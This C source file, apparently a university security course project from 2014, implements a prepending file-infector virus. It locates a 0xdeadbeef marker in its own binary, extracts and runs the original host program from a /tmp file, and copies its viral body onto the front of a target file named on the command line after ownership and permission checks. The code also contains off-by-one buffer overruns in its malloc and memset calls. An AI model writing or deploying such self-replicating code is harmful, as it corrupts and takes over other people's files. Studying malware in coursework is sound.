/**************************
Project 4 CS4471
Written by Jaclyn Barnes
MTU Computer Science Dep.
Dec 11, 2014
************************/

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>


int main(int argc, char** argv){
  char deadbeef[4] = { 0xde, 0xad, 0xbe, 0xef };

  /* Check if /tmp/host.ruid exists
   * If no, copy host to /tmp/host.ruid
   * If yes, delete /tmp/host.ruid and exit
   */
  struct stat tempstats;
  char tempname[30]={0};

  uid_t ruid, euid, suid;
  getresuid(&ruid, &euid, &suid);

  sprintf(tempname, "/tmp/host.%d", ruid);
  //fprintf(stdout, "The temp file is %s \n", tempname);

  int exist = stat(tempname, &tempstats);
  if (exist == 0){
    fprintf(stdout, "%s already exists \n", tempname);
    remove(tempname);
    return -1;
  }

  char *hostname;
  hostname = malloc(strlen(argv[0]));
  memset(hostname,0,strlen(argv[0])+1);
  sprintf(hostname, "%s", argv[0]);

  FILE *host = fopen(hostname, "r");
  if (!host) {
    printf("Unable to open host %s! \n", hostname);
  }


  // Find infected portion of host
  fseek(host, 0L, SEEK_END);
  long hostsize = ftell(host);
  fseek(host, 0L, SEEK_SET);

  char *hoststr = malloc(hostsize);
  memset(hoststr, 0, hostsize + 1);

  char cur;
  long infected = -1;
  int i = 0, j = 0;

  fread(hoststr, 1, hostsize, host);
  for (i = 0; i < hostsize; i++){
    if (infected < 0){
      for (j = 0; j < 4; j++){
	if (hoststr[i + j] != deadbeef[j]|| i+j>=hostsize)
	  break;	
      }
      if (j == 4) {
	infected = i;
      }		
    }
  }
   
  //free(hoststr);
  // Write non-virus portion of host to temp file
  char* hostclean;
  hostclean = malloc(hostsize-infected-4);
  memset(hostclean,0,hostsize-infected-4+1);

  fseek(host, infected+4, SEEK_SET);
  int sizeread = 0;  
  sizeread = fread(hostclean, 1, hostsize-infected-4, host);

  FILE *temp = fopen(tempname, "w");
  if (!temp) {
    printf("Unable to open temp! %s \n", tempname);
    //execvp(tempname, &argv[0]);
  }

  fwrite(hostclean, 1, hostsize-infected-4, temp);
  fclose(temp);
  free(hostclean);
  chmod(tempname, S_IXUSR | S_IRUSR | S_IWUSR);

  printf(" %s \n", tempname);
  /* Check if argv[1] exists,
   * is owned and writeable by the ruid of current process,
   * DOES NOT HAVE ANY EXECUTABLE PERMISSIONS (user, group, or world)
   * If all conditions are true, check if infected
   */
  char* targetname;
  int notSafe = 0;

  if (argc < 2) {
    execvp(tempname, &argv[0]);
  }


  targetname = malloc(strlen(argv[1]));
  memset(targetname,0,strlen(argv[1])+1);
  sprintf(targetname, "%s", argv[1]);

  int flag = -1;
  struct stat targetstats;   
  flag = stat(targetname, &targetstats);
  if (flag != 0) {
    printf("Error retrieving stats on %s \n", targetname);
    execvp(tempname, &argv[0]);
  }

  // Check ownership of target
  if (ruid != targetstats.st_uid) notSafe = 1;
  if (!(targetstats.st_mode & S_IWUSR)) notSafe = 1;
  
  // Check target is not executable
  if (targetstats.st_mode & S_IXUSR) notSafe = 1;
  if (targetstats.st_mode & S_IXGRP) notSafe = 1;
  if (targetstats.st_mode & S_IXOTH) notSafe = 1;

  if(notSafe){
    fprintf(stdout, "Not safe to infect file %s \n", targetname);
    execvp(tempname, &argv[0]);
  }


  FILE *target = fopen(targetname, "r");
  if (!target) {
    printf("Unable to open target %s! \n", targetname);
    execvp(tempname, &argv[0]);
  }


  // Check if target is infected
  fseek(target, 0L, SEEK_END);
  int targetsize = ftell(target);
  fseek(target, 0L, SEEK_SET);

  char *targetstr = malloc(targetsize);
  //if(targetstr==NULL)
    //printf("Could not get enough target size here\n");
  memset(targetstr, 0, targetsize + 1);


  int infectedtarget = -1;
  i = 0;
  j = 0;

  fread(targetstr, 1, targetsize, target);

  for (i = 0; i < targetsize; i++){
    if (infectedtarget < 0){
      for (j = 0; j < 4; j++){
	if (targetstr[i + j] != deadbeef[j] || i+j>=targetsize)
	  break;
      }
      if (j == 4) {
	printf("File %s is already infected \n",targetname);
	infectedtarget = i;
	notSafe = 1;
      }
    }
  }

  //fclose(target);

  /* If file is safe (correct permissions, ownership, and not infected), 
   * prepend first VIRUS_LENGTH of cfwriteurrent executing program to file at argv[1]
   * If not, exit
   */
  if (notSafe == 0){
    fprintf(stdout, "Safe to infect file %s \n", targetname);
    //Infect file
    target = fopen(targetname, "wb");
    if (!target) {
      printf("Unable to open target! \n");
      execvp(tempname, &argv[0]);
    }
    char* virus;
    virus = malloc(infected+4);
    fseek(host, 0L, SEEK_SET);
    fread(virus, 1, infected+4, host);
    // Virus plus deadbeef
    //fprintf(stdout,"total size is %d\n",infected+4+targetsize);
    fwrite(virus, 1, infected + 4, target);
    fwrite(targetstr, 1, targetsize, target);
    
    fclose(target);
    fclose(host);
  }
  else {
    fprintf(stdout, "Not safe to infect file %s \n", targetname);
  }
  
  execvp(tempname, &argv[0]);
}

